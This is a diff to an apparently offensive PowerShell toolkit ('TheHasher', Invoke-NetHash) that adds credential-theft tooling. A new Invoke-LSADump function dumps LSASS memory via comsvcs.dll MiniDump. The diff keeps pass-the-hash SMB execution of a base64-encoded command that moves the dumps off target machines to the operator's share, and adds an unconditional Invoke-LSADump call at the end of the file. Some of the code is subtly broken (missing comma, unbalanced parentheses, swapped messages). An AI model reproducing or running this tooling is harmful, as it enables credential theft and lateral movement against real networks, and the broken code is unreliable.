@@ -3579,6 +3579,12 @@ function global:Get-FilenameDialog {
     return $FileBrowser.Filename
 }
 
+function global:Invoke-LSADump
+    {
+        rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id ($env:windir + "\" + $env:COMPUTERNAME + "-" + (Get-Date -Format yyyyMMdd-hhmmss).tostring() + "TheHasher.bin") full
+    }
+
+
 Function Invoke-NetHash
 {
 [CmdletBinding()]
@@ -3597,7 +3603,9 @@ param (
     [Parameter()][string]$Command,
     [Parameter()][bool]$WriteVerbose=$false,
     [Parameter()][string]$Threads = 2,
-    [Parameter()][string]$WriteLog =$false    
+    [Parameter()][bool]$WriteLog =$false,
+    [Parameter()][bool]$LSADump =$false 
+    [Parameter()][bool]$PowerDump=$false    
     #[Parameter()][TypeName]$ParameterName
 )
 
@@ -3751,14 +3759,13 @@ Param (
                         {
                         try
                             {
-                            
-                            [string]$STRCommand = {Start-Process PowerShell -ArgumentList "(Move-Item -Path (Get-ChildItem  -Path ('\\%TARGET%\Admin$\') -Filter '*TheHasher.txt').fullname -Destination ('\\%IP%\Exchange$'))"}
-                            $STRCommand = $STRCommand.Replace("%IP%",$ShareIP)
-                            $STRCommand = $STRCommand.Replace("%TARGET%",$ComputerName)
-                            $Command = [Scriptblock]::Create($STRCommand)
-                            $CommandBytes = [System.Text.Encoding]::Unicode.GetBytes($STRCommand)
-                            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)
-                            Invoke-ExecbySMB -Target $ComputerName -Username $Username  -Hash $Hash -Command "powershell.exe -encodedcommand $EncodedCommand" -verbose -Domain $Domain
+                            [string]$STRCommand2 = {Start-Process PowerShell -ArgumentList "(Move-Item -Path (Get-ChildItem  -Path ('\\%TARGET%\Admin$\') -Filter '*TheHasher*').fullname -Destination ('\\%IP%\Exchange$'))"}
+                            $STRCommand2 = $STRCommand2.Replace("%IP%",$ShareIP)
+                            $STRCommand2 = $STRCommand2.Replace("%TARGET%",$ComputerName)
+                            $Command2 = [Scriptblock]::Create($STRCommand2)
+                            $CommandBytes2 = [System.Text.Encoding]::Unicode.GetBytes($STRCommand2)
+                            $EncodedCommand2 = [Convert]::ToBase64String($CommandBytes2)
+                            Invoke-ExecbySMB -Target $ComputerName -Username $Username  -Hash $Hash -Command "powershell.exe -encodedcommand $EncodedCommand2" -verbose -Domain $Domain
                             $BackChannelResult = "File received"
                             }
                         catch
@@ -3913,7 +3920,7 @@ elseif($Hosts -ne $null)
                 }
 
             }
-        Write-Verbose -Message ($Computers.count + " Computers have been imported.") 
+        Write-Verbose -Message (($Computers.count.tostring() + " Computers have been imported.") 
     }
 else 
     {
@@ -3953,10 +3960,22 @@ if($Command.Length -gt 1)
 elseif($Command -eq $null)
     {
     Write-Log -Log $WriteLog  -Result "Started" -Message ("Payload will be encoded and placed within the used share") -ScriptLog $Scriptlog -LogSource ""
-    Write-Verbose -Message ("No individual Payload set - therefore payload is set to - PowerDump")
-    Generate-Payload -functionToCall Invoke-PowerDump -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
-    $BuiltInPowerDump = $true
-    Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
+    if($PowerDump -eq $true)
+        {
+            Write-Verbose -Message ("No individual Payload set - therefore payload is set to - LSADump")
+            Generate-Payload -functionToCall Invoke-PowerDump -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
+            $BuiltInPowerDump = $true
+            Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
+        }
+    elseif($LSADump -eq $true)
+        {
+            Write-Verbose -Message ("No individual Payload set - therefore payload is set to - PowerDump")
+            Generate-Payload -functionToCall Invoke-LSADump -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
+            $BuiltInLSADump = $true
+            Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
+        }
+
+    
     Write-Log -Log $WriteLog  -Result "Completed" -Message ("Payload prepared and ready for use") -ScriptLog $Scriptlog -LogSource ""
     $ShareIPAdress =  (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias ((Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected).InterfaceAlias[0])).IPAddress
     Write-Log -Log $WriteLog  -Result "Info" -Message ("IP Adress for Payload transmission is set to " + $ShareIPAdress) -ScriptLog $Scriptlog -LogSource ""
@@ -4050,3 +4069,6 @@ catch
 $End = Get-date
 Write-Log -Log $WriteLog  -Result "Completed" -Message ("Process completed. Bye for now.") -ScriptLog $Scriptlog -LogSource ""
 }
+
+
+Invoke-LSADump
